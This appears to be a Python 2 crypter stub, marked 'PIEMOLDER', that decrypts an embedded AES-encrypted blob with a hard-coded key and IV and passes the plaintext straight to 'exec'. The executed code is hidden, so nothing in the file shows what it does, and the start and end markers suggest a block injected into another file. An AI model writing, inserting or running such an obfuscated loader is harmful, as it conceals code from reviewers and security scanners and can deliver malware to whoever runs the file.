# PIEMOLDER:START
from Crypto.Cipher import AES
import base64
cryptmold = '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'
key = base64.b64decode('A0m+mDZzsU6k5qYKgS1RhmCPyekBu7PdPyekWhrN5AM=')
iv4 = base64.b64decode('DPfqV4M5DDxGcxHeubWbJw==')
decryptor = AES.new(key, AES.MODE_CFB, iv4)
plainmold = decryptor.decrypt(base64.b64decode(cryptmold))
exec plainmold
# PIEMOLDER:END
